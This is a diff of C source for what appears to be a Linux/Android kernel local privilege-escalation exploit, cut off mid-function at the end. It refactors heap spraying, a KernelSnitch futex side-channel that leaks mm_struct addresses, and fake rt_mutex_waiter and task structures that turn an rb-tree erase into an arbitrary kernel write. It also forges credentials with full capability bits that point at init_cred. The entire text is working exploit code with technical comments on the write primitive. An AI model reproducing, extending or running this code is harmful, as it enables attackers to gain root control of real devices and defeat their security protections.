@@ -1,68 +1,77 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
+#include "target.h"
 #include "kernelsnitch/kernelsnitch.h"
 
-static struct kernelsnitch_shared_state *ks;
-static size_t mm_objs_per_slab;
-static unsigned char *skb_buf;
-static int reclaim_sv[2] = {-1, -1};
-static struct mm_ctx prepare_ctx;
-static struct mm_ctx spray_ctx;
-static struct mm_ctx pre_ctx;
-static struct mm_ctx post_ctx;
-static pid_t child_leak;
-
-static long long ms_since(struct timespec *t0) {
-  struct timespec now;
-  clock_gettime(CLOCK_MONOTONIC, &now);
-  return (now.tv_sec - t0->tv_sec) * 1000LL +
-         (now.tv_nsec - t0->tv_nsec) / 1000000LL;
-}
-
-uintptr_t page_base;
-uintptr_t last_mm_struct;
-uintptr_t fake_lock;
-uintptr_t fake_w0;
-uintptr_t fake_task;
-uintptr_t fake_parent;
-uintptr_t fake_right;
-uintptr_t fake_left;
-uintptr_t fake_fops;
-
-int pselect_custom_write;
+HeapContext g_heap_context;
 uintptr_t pselect_custom_target;
-int pselect_child_node;  /* Preserve initialized bytes when set. */
+uint64_t g_direct_map_end = DIRECT_MAP_END;
+#define ks (g_heap_context.snitch)
+#define mm_objs_per_slab (g_heap_context.mm_objs_per_slab)
+#define skb_buf (g_heap_context.skb_buffer)
+#define reclaim_sv (g_heap_context.current.reclaim.fd)
+#define prepare_ctx (g_heap_context.prepare)
+#define spray_ctx (g_heap_context.spray)
+#define pre_ctx (g_heap_context.pre)
+#define post_ctx (g_heap_context.post)
+#define child_leak (g_heap_context.leak_child)
 
-void set_pselect_write_mode(uintptr_t target, int mode) {
-  pselect_custom_target = target;
-  pselect_custom_write = mode;
+static const struct kernel_offsets *profile_values(void) {
+  return target_profile_values(&g_target_profile);
 }
 
-void clear_pselect_write(void) {
-  pselect_custom_write = 0;
-  pselect_custom_target = 0;
+/* Decoupling plan: compute elapsed monotonic time. Input: reference timestamp;
+ * output: milliseconds. Future: shared_elapsed_ms(const struct timespec *). */
+static long long ms_since(struct timespec *t0) {
+  return (long long)runtime_elapsed_ms(t0);
 }
 
+/* Persist stage-boundary diagnostics before a kernel panic or filesystem
+ * rollback can discard buffered lines. Unsupported fsync targets are ignored. */
+void log_sync(void) {
+  fflush(stdout);
+  (void)fsync(STDOUT_FILENO);
+}
+
+/* Decoupling plan: decide whether TCP zerocopy is selected. Inputs: profile and
+ * runtime-config snapshot; output: boolean. Future:
+ * tcp_zerocopy_supports(profile, config), with no environment reread. */
+int tcp_route_selected(void) {
+  return g_runtime_config.tcp_zerocopy_enabled &&
+         target_profile_supports_tcp_zerocopy(&g_target_profile);
+}
+
+/* Decoupling plan: report multicast-waiter capability. Input: profile; output:
+ * boolean. Future: multicast_waiter_supports(const TargetProfile *). */
+int kernel5_route_selected(void) {
+  return target_profile_supports_multicast_waiter(&g_target_profile);
+}
+
+/* Allocate the address-discovery engine. Inputs: resolved profile geometry and
+ * runtime CPU count; output: the owned mmap-backed KernelSnitchContext. */
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  ks = kernelsnitch_context_init(
+      mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
 }
 
+/* Query discovered collisions. Input: immutable snitch context; output:
+ * boolean collision readiness. */
 int kernelsnitch_collisions_ready(void) {
-  return kernelsnitch_found_collisions(ks);
+  return kernelsnitch_context_has_collisions(ks);
 }
 
-void run_kernelsnitch_bruteforce(void) {
-  kernelsnitch_bruteforce(ks);
-}
-
+/* Obtain the selected mm_struct candidate. Input: immutable snitch context;
+ * output: kernel address or -1. */
 uintptr_t current_kernelsnitch_mm_struct(void) {
-  return ks->mm_struct;
+  return kernelsnitch_context_result(ks);
 }
 
+/* Retain the result, destroy the owned snitch context and clear the compatibility
+ * owner. Input: current context; output: kernel address or -1. */
 uintptr_t cleanup_kernelsnitch(void) {
-  uintptr_t leaked = kernelsnitch_cleanup(ks);
+  uintptr_t leaked = kernelsnitch_context_result(ks);
+  kernelsnitch_context_destroy(ks);
   ks = NULL;
   return leaked;
 }
@@ -88,6 +97,8 @@ void read_first_line(const char *path, char *buf, size_t len) {
   buf[strcspn(buf, "\r\n")] = 0;
 }
 
+/* Decoupling plan: log a captured runtime configuration. Input: RuntimeConfig;
+ * output: diagnostics only. Future: runtime_config_log(const RuntimeConfig *). */
 void log_startup_context(void) {
   char attr[256];
   char enforce[32];
@@ -122,9 +133,13 @@ void log_startup_context(void) {
                "Seccomp_filters=%s", values[0], values[1], values[2]);
     }
   }
-  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
-             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
-             enforce);
+  struct timespec boot;
+  SYSCHK(clock_gettime(CLOCK_BOOTTIME, &boot));
+  double boot_ms = boot.tv_sec * 1000.0 + boot.tv_nsec / 1e6;
+  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u "
+             "boot_ms=%.0f attr=%s enforce=%s\n",
+             getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
+             attr, enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
   pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
              getpid(), BUILD_VARIANT_LABEL);
@@ -132,8 +147,9 @@ void log_startup_context(void) {
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
              getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)p0_kernel_phys_load,
-             (unsigned long long)P0_KERNEL_PHYS_DELTA,
+             (unsigned long long)g_resolved_addresses.kernel_phys_load,
+             (unsigned long long)(g_resolved_addresses.kernel_phys_load -
+                                  P0_PHYS_OFFSET),
              (unsigned long long)SLIDE_NFULNL_LOGGER,
              (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
              (unsigned long long)SLIDE_INIT_TASK,
@@ -160,31 +176,25 @@ long sched_setattr_tid(int tid, int nice_value) {
   errno = 0;
   long ret = syscall(274, tid, &attr, 0);
   if (ret != 0) {
-    pr_error("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
+    pr_warning("sched_setattr(%d,BATCH,nice=%d) ret=%ld errno=%d\n", tid, nice_value, ret, errno);
   }
   return ret;
 }
 
-/* Bootloader-selected physical load address. */
-uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
+/* S06 authoritative address snapshot. */
+ResolvedAddresses g_resolved_addresses = {
+    .soc = TARGET_SOC_QCOM,
+    .kernel_phys_load = P0_KERNEL_PHYS_LOAD,
+    .init_cred_image = 0,
+};
 
-/* Selected entry's init_cred image address. */
-uintptr_t g_init_cred_image;
-
+/* Decoupling plan: resolve physical/image address mapping. Input: target
+ * profile; output: ResolvedAddresses. Future: resolve_runtime_addresses(). */
 void init_p0_profile(void) {
   pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
-          (unsigned long long)p0_kernel_phys_load,
-          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
-}
-
-uintptr_t p0_data_alias(uintptr_t image_addr) {
-  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
-  uintptr_t phys = p0_kernel_phys_load + off;
-  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
-}
-
-uintptr_t data_addr(uintptr_t image_addr) {
-  return p0_data_alias(image_addr);
+          (unsigned long long)g_resolved_addresses.kernel_phys_load,
+          (unsigned long long)(g_resolved_addresses.kernel_phys_load -
+                               P0_PHYS_OFFSET));
 }
 
 void put64(unsigned char *p, size_t off, uint64_t value) {
@@ -195,17 +205,46 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
   memcpy(p + off, &value, sizeof(value));
 }
 
-static void fill_init_cred_copy(unsigned char *p, size_t off) {
+/* Decoupling plan: encode the profile-specific credential template. Inputs:
+ * profile, destination and offset; output: validation/status. Future:
+ * payload_build_credential_template(profile, buffer, offset). */
+static int fill_profile_cred_copy(unsigned char *p, size_t off) {
+  const struct kernel_offsets *v = profile_values();
+  if (!v || !v->cred_copy_size || v->cred_copy_size > ORDER3_SIZE ||
+      v->cred_usage_offset + sizeof(uint32_t) > v->cred_copy_size ||
+      v->cred_caps_offset + v->cred_caps_count * sizeof(uint64_t) >
+          v->cred_copy_size) {
+    pr_error("credential copy profile is incomplete\n");
+    return 0;
+  }
   unsigned char *c = p + off;
-  memset(c, 0, 136);
-  put32(c, 0, 1);
-  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
+  memset(c, 0, v->cred_copy_size);
+  put32(c, v->cred_usage_offset, v->cred_usage_value);
+  for (uint32_t i = 0; i < v->cred_caps_count; i++) {
+    put64(c, v->cred_caps_offset + i * sizeof(uint64_t), v->cred_caps_value);
+  }
+
+  const uint32_t ref_offsets[] = {
+      v->cred_ref0_offset, v->cred_ref1_offset,
+      v->cred_ref2_offset, v->cred_ref3_offset,
+  };
+  const uint64_t ref_images[] = {
+      v->cred_ref0_image, v->cred_ref1_image,
+      v->cred_ref2_image, v->cred_ref3_image,
+  };
+  for (size_t i = 0; i < v->cred_ref_count; i++) {
+    if (ref_offsets[i] + sizeof(uint64_t) > v->cred_copy_size) {
+      pr_error("credential reference %zu exceeds configured copy size\n", i);
+      return 0;
+    }
+    put64(c, ref_offsets[i],
+          resolved_addresses_data_alias(&g_resolved_addresses, ref_images[i]));
+  }
+  return 1;
 }
 
+/* Decoupling plan: create an mm-allocation helper child. Input: heap context;
+ * output: owned PID. Future: heap_context_spawn_mm_child(). */
 pid_t clone_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
@@ -221,21 +260,27 @@ pid_t clone_child(void) {
   return child;
 }
 
+/* Decoupling plan: create and retain the leak helper child. Input/output: heap
+ * context; output: owned PID. Future: heap_context_spawn_leak_child(). */
 pid_t clone_leak_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
-    kernelsnitch_find_collisions(ks);
+    kernelsnitch_context_find_collisions(ks);
     exit(0);
   }
   return child;
 }
 
+/* Decoupling plan: open the child-related memfd allocation. Input: PID; output:
+ * owned fd/error. Future: heap_context_open_memfd(context, child). */
 int open_memfd(pid_t child) {
   char path[64];
   snprintf(path, sizeof(path), "/proc/%d/mem", child);
   return SYSCHK(open(path, O_RDONLY));
 }
 
+/* Decoupling plan: terminate and reap a heap helper. Input: owned PID; output:
+ * ownership cleared. Future: heap_context_reap_child(). */
 void kill_child(pid_t child) {
   if (child <= 0) {
     return;
@@ -244,13 +289,48 @@ void kill_child(pid_t child) {
   SYSCHK(waitpid(child, NULL, 0));
 }
 
+/* Decoupling plan: release the current reclaim socket pair. Input/output: heap
+ * context. Future: reclaim_pair_destroy(ReclaimPair *). */
 void close_reclaim_sockets(void) {
-  for (int i = 0; i < 2; i++) {
-    if (reclaim_sv[i] >= 0) {
-      close(reclaim_sv[i]);
-      reclaim_sv[i] = -1;
-    }
-  }
+  payload_page_destroy(&g_heap_context.current);
+}
+
+/* Decoupling plan: transfer current reclaim sockets into quarantine. Input:
+ * heap context; output: transfer status. Future: reclaim_pair_quarantine(). */
+int quarantine_reclaim_sockets(void) {
+  return payload_page_move(&g_heap_context.quarantine,
+                           &g_heap_context.current,
+                           PAYLOAD_PAGE_QUARANTINED);
+}
+
+/* Decoupling plan: release all quarantined reclaim ownership. Input/output:
+ * heap context. Future: heap_context_release_quarantine(). */
+void release_quarantined_reclaim_sockets(void) {
+  payload_page_destroy(&g_heap_context.quarantine);
+}
+
+/* Decoupling plan: move the current payload page into the prebuilt slot. Input:
+ * heap context; output: move status. Future: payload_page_move(prebuilt,current). */
+int stash_prebuilt_page(void) {
+  return payload_page_move(&g_heap_context.prebuilt,
+                           &g_heap_context.current,
+                           PAYLOAD_PAGE_PREBUILT);
+}
+
+/* Decoupling plan: move the prebuilt page into the active slot. Input/output:
+ * heap context; output: activation status. Future: heap_activate_prebuilt_page(). */
+int activate_prebuilt_page(void) {
+  if (!payload_page_has_reclaim(&g_heap_context.prebuilt)) return 0;
+  close_reclaim_sockets();
+  return payload_page_move(&g_heap_context.current,
+                           &g_heap_context.prebuilt,
+                           PAYLOAD_PAGE_CURRENT);
+}
+
+/* Decoupling plan: destroy the prebuilt page and its reclaim pair. Input/output:
+ * heap context. Future: payload_page_destroy(&context->prebuilt). */
+void discard_prebuilt_page(void) {
+  payload_page_destroy(&g_heap_context.prebuilt);
 }
 
 void close_ctx_memfds(struct mm_ctx *ctx) {
@@ -270,6 +350,9 @@ void free_ctx_storage(struct mm_ctx *ctx) {
   ctx->mm_cnt = 0;
 }
 
+/* Decoupling plan: clean one heap-preparation attempt. Input: HeapContext;
+ * output: all attempt-owned resources released. Future:
+ * heap_context_reset_attempt(), separate from route cleanup. */
 void cleanup_page_prepare_state(void) {
   close_ctx_memfds(&prepare_ctx);
   close_ctx_memfds(&spray_ctx);
@@ -287,6 +370,8 @@ void cleanup_page_prepare_state(void) {
   skb_buf = NULL;
 }
 
+/* Decoupling plan: create a helper child and associated memfd. Input/output:
+ * heap context; output: owned fd/error. Future: heap_context_clone_memfd(). */
 int clone_memfd(void) {
   pid_t child = clone_child();
   int fd = open_memfd(child);
@@ -294,6 +379,9 @@ int clone_memfd(void) {
   return fd;
 }
 
+/* Decoupling plan: allocate the four mm-context sets used for heap shaping.
+ * Inputs: profile and HeapContext; output: initialized sets/status. Future:
+ * heap_context_prepare_mm_sets(), returning errors instead of exiting. */
 void prepare_ctxs(void) {
   prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
@@ -312,74 +400,116 @@ void prepare_ctxs(void) {
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
 }
 
-int prepare_skb_payload(uintptr_t base) {
+/* Decoupling plan: construct shared fake objects and route-specific waiter data.
+ * Inputs: profile, addresses, immutable WriteRequest and page base; outputs:
+ * payload bytes/layout. Future: build_payload() plus three chain encoders. */
+int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
-  uintptr_t payload_base = base + SKB_DATA_DELTA;
+  int tcp = tcp_route_selected();
+  long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
+  size_t chunk_bias = tcp ? 0xe80 : (size_t)SKB_FRAG_BIAS;
+  size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t)FAKE_TASK_OFF;
+
+  uintptr_t payload_base = base + payload_delta;
 
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
-  fake_task = payload_base + FAKE_TASK_OFF;
-  fake_fops = payload_base + FOPS_TABLE_OFF;
-  if (pselect_custom_write) {
-    if (pselect_child_node) {
-      if (pselect_custom_write == 2) {
-        /* W2 uses init_cred; resolve it from the selected device entry. */
-        fake_right = data_addr(g_init_cred_image);
-      } else {
-        /* W1 targets the initialized page at base+0x100. */
-        fake_right = base + 0x100;
-      }
-    } else {
-      fake_right = 0;  /* leaf: write 0 */
-    }
-    fake_left = 0;
-    if (pselect_custom_write == 2) {
-      fake_fops = payload_base + CRED_COPY_OFF;
-    }
-    fake_parent = pselect_custom_target - 8;
-  }
+  fake_task = payload_base + fake_task_off;
+  uintptr_t default_fops = payload_base + FOPS_TABLE_OFF;
+  uintptr_t credential_fops =
+      payload_base + (tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF);
+  PayloadWriteLayout write_layout = payload_write_layout(
+      request, base, default_fops, credential_fops,
+      resolved_addresses_data_alias(&g_resolved_addresses,
+                                    g_resolved_addresses.init_cred_image));
+  fake_parent = write_layout.parent;
+  fake_right = write_layout.right;
+  fake_left = write_layout.left;
+  fake_fops = write_layout.fops;
 
   uintptr_t write_pc = fake_parent;
   uintptr_t write_right = fake_right;
   uintptr_t write_left = fake_left;
-  uint64_t waiter_task = INIT_TASK;
-  uint64_t task_group = ROOT_TASK_GROUP;
-  uint64_t pi_top_task = INIT_TASK;
+  /* Direct-map aliases (data_addr) resolve to the same physical pages and
+   * are dereferenceable on every SoC — the tcp route already uses SLIDE_INIT_TASK
+   * the same way for the on-stack waiter. */
+  uint64_t waiter_task = SLIDE_INIT_TASK;
+  uint64_t task_group = SLIDE_ROOT_TASK_GROUP;
+  uint64_t pi_top_task = SLIDE_INIT_TASK;
+
+  const struct kernel_offsets *v = profile_values();
+  int compact = target_profile_has_compact_waiter(&g_target_profile);
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+    unsigned char *p = skb_buf + chunk + chunk_bias;
 
     put32(p, LOCK_OFF + 0x00, 0);
     put64(p, LOCK_OFF + 0x08, fake_w0);
     put64(p, LOCK_OFF + 0x10, fake_w0);
     put64(p, LOCK_OFF + 0x18, fake_task | 1);
 
-    put64(p, W0_OFF + 0x00, 1);
-    put64(p, W0_OFF + 0x08, 0);
-    put64(p, W0_OFF + 0x10, 0);
-    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    if (compact) {
+      /* Words ride the erase relink: pc = value, rb_left = dest,
+       * rb_right = 0 or the one-child arm also clobbers *(value) with
+       * dest-8. Value 0 uses pc = dest-8 (stores 0 at *dest); pc = 0
+       * would leave the node parentless for enqueue_pi to trash
+       * fake_task. prio > 120 gates this erase. The relink's second
+       * write lands in *(value+8): cred image on W2, page rb_root at 0. */
+      put64(p, W0_OFF + 0x00, 1);           /* tree_entry.rb_parent_color */
+      put64(p, W0_OFF + 0x08, 0);           /* tree_entry.rb_right */
+      put64(p, W0_OFF + 0x10, 0);           /* tree_entry.rb_left */
+      build_compact_waiter_payload(p + W0_OFF, request, &write_layout);
+      put64(p, W0_OFF + 0x30, waiter_task); /* task */
+      put64(p, W0_OFF + 0x38, fake_lock);   /* lock */
+      put32(p, W0_OFF + 0x40, 0);           /* wake_state */
+      put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO); /* prio */
+      put64(p, W0_OFF + 0x48, 0);           /* deadline */
+      put64(p, W0_OFF + 0x50, 0);           /* ww_ctx */
+    } else {
+      /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
+      put64(p, W0_OFF + 0x00, 1);
+      put64(p, W0_OFF + 0x08, 0);
+      put64(p, W0_OFF + 0x10, 0);
+      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
+      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
+      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    }
 
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
+    /* Use runtime offsets for 6.1 compact; target.h constants for 6.6. */
+    uint32_t ft_prio_off       = compact ? v->task_prio
+                                         : FAKE_TASK_PRIO_OFF;
+    uint32_t ft_nprio_off      = compact ? v->task_normal_prio
+                                         : FAKE_TASK_NORMAL_PRIO_OFF;
+    uint32_t ft_tg_off         = compact ? v->task_sched_task_group
+                                         : FAKE_TASK_TASK_GROUP_OFF;
+    uint32_t ft_pi_lock_off    = compact ? v->task_pi_lock
+                                         : FAKE_TASK_PI_LOCK_OFF;
+    uint32_t ft_pi_wait_off    = compact ? v->task_pi_waiters
+                                         : FAKE_TASK_PI_WAITERS_OFF;
+    uint32_t ft_pi_top_off     = compact ? v->task_pi_top_task
+                                         : FAKE_TASK_PI_TOP_TASK_OFF;
+    uint32_t ft_pi_blocked_off = compact ? v->task_pi_blocked_on
+                                         : FAKE_TASK_PI_BLOCKED_ON_OFF;
+
+    put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
+    put32(p, fake_task_off + ft_prio_off, FAKE_TASK_PRIO);
+    put32(p, fake_task_off + ft_nprio_off, FAKE_TASK_PRIO);
+    put32(p, fake_task_off + ft_pi_lock_off, 0);
     /* Empty PI waiters avoid tree rebalancing during reinsertion. */
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+    put64(p, fake_task_off + ft_pi_wait_off, 0);
+    put64(p, fake_task_off + ft_pi_wait_off + 0x08, 0);
+    put64(p, fake_task_off + ft_tg_off, task_group);
+    put64(p, fake_task_off + ft_pi_top_off, pi_top_task);
+    put64(p, fake_task_off + ft_pi_blocked_off, 0);
 
     put64(p, RIGHT_OFF + 0x00, fake_parent);
     put64(p, RIGHT_OFF + 0x08, 0);
@@ -389,18 +519,26 @@ int prepare_skb_payload(uintptr_t base) {
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
-    if (pselect_custom_write >= 2) {
-      fill_init_cred_copy(p, CRED_COPY_OFF);
+    if (write_layout.needs_credential_copy &&
+        !fill_profile_cred_copy(p, tcp ? TCP_CRED_COPY_OFF : CRED_COPY_OFF)) {
+      return 0;
     }
   }
   return 1;
 }
 
-uintptr_t prepare_kernel_page(void) {
+/* Decoupling plan: perform one complete heap-shaping/page-reclaim attempt.
+ * Inputs: HeapContext, profile and payload request; output: PayloadPage/status.
+ * Future: heap_context_prepare_payload_page(), with unique resource ownership. */
+uintptr_t prepare_kernel_page(const WriteRequest *request) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
+  /* Release every userspace reference from the preceding write before the
+   * context arrays are replaced. Keeping the final post-spray memfd pinned
+   * leaked one mm_struct per stage and progressively poisoned later sprays. */
   close_reclaim_sockets();
-  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  cleanup_page_prepare_state();
+  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
@@ -417,8 +555,8 @@ uintptr_t prepare_kernel_page(void) {
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  ks = kernelsnitch_context_init(
+      mm_struct_sz(), MM_ORDER, cpu_count, kernelsnitch_collisions(), 0);
   pr_info("[spray] mm spray + kernelsnitch ready (cpu=%d) +%lldms\n",
           cpu_count, ms_since(&t_spray));
 
@@ -465,8 +603,11 @@ uintptr_t prepare_kernel_page(void) {
         break;
       }
       long long waited = ms_since(&t_wait);
-      if (waited >= 60000) {
-        pr_warning("leak child stuck >60s, killing it\n");
+      uint32_t timeout_ms =
+          target_profile_execution(&g_target_profile)
+              ->heap_kernelsnitch_timeout_ms;
+      if ((uint64_t)waited >= timeout_ms) {
+        pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
         kill(child_leak, SIGKILL);
         waitpid(child_leak, NULL, 0);
         break;
@@ -491,9 +632,9 @@ uintptr_t prepare_kernel_page(void) {
       pr_warning("leak child exit status=%d\n", leak_status);
     }
   }
-  if (!kernelsnitch_found_collisions(ks)) {
+  if (!kernelsnitch_context_has_collisions(ks)) {
     pr_warning("[spray] futex collisions not found\n");
-    kernelsnitch_cleanup(ks);
+    kernelsnitch_context_destroy(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
@@ -504,14 +645,19 @@ uintptr_t prepare_kernel_page(void) {
 
   pr_info("[spray] futex collisions found +%lldms\n",
           ms_since(&t_spray));
-  kernelsnitch_bruteforce(ks);
+  (void)kernelsnitch_context_scan(ks);
   pr_info("[spray] mm_struct leaked=0x%zx +%lldms\n",
-          (size_t)ks->mm_struct, ms_since(&t_spray));
-  uintptr_t leaked = ks->mm_struct;
+          kernelsnitch_context_result(ks), ms_since(&t_spray));
+  uintptr_t leaked = kernelsnitch_context_result(ks);
+  /* the tag nibble replaces bits 56-59; 0xf restores the canonical VA */
+  leaked |= (uintptr_t)0xf << 56;
   last_mm_struct = leaked;
-  if (leaked == (uintptr_t)-1) {
+  /* mm_structs live in the direct map */
+  if (leaked == (uintptr_t)-1 ||
+      leaked < KERNELSNITCH_IDENTITY_START ||
+      leaked >= g_direct_map_end) {
     pr_warning("KernelSnitch mm_struct leak failed\n");
-    kernelsnitch_cleanup(ks);
+    kernelsnitch_context_destroy(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
@@ -521,8 +667,8 @@ uintptr_t prepare_kernel_page(void) {
   }
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  if (!prepare_skb_payload(base)) {
-    kernelsnitch_cleanup(ks);
+  if (!prepare_skb_payload(base, request)) {
+    kernelsnitch_context_destroy(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
       kill_child(prepare_ctx.childs[i]);
@@ -532,6 +678,7 @@ uintptr_t prepare_kernel_page(void) {
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+  g_heap_context.current.state = PAYLOAD_PAGE_CURRENT;
   int sndbuf = 1 << 20;
   setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
@@ -587,7 +734,7 @@ uintptr_t prepare_kernel_page(void) {
     }
   }
   pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
-  kernelsnitch_cleanup(ks);
+  kernelsnitch_context_destroy(ks);
   ks = NULL;
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -599,22 +746,49 @@ uintptr_t prepare_kernel_page(void) {
   return base;
 }
 
-uintptr_t prepare_good_kernel_page(void) {
-  int max_attempts = 4;
+/* Decoupling plan: retry heap preparation until a usable page is available.
+ * Inputs: HeapContext and request; output: PayloadPage/status. Future:
+ * heap_context_prepare_verified_page(), separating retry policy from one attempt. */
+uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
+  const struct execution_settings *execution =
+      target_profile_execution(&g_target_profile);
+  int max_attempts = (int)execution->heap_prepare_max_attempts;
   struct timespec t_good;
   clock_gettime(CLOCK_MONOTONIC, &t_good);
   struct timespec deadline = t_good;
-  deadline.tv_sec += 240;
+  uint64_t timeout_ns =
+      (uint64_t)execution->heap_prepare_timeout_ms * 1000000ULL;
+  deadline.tv_sec += (time_t)(timeout_ns / 1000000000ULL);
+  deadline.tv_nsec += (long)(timeout_ns % 1000000000ULL);
+  if (deadline.tv_nsec >= 1000000000L) {
+    deadline.tv_sec++;
+    deadline.tv_nsec -= 1000000000L;
+  }
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
-    uintptr_t base = prepare_kernel_page();
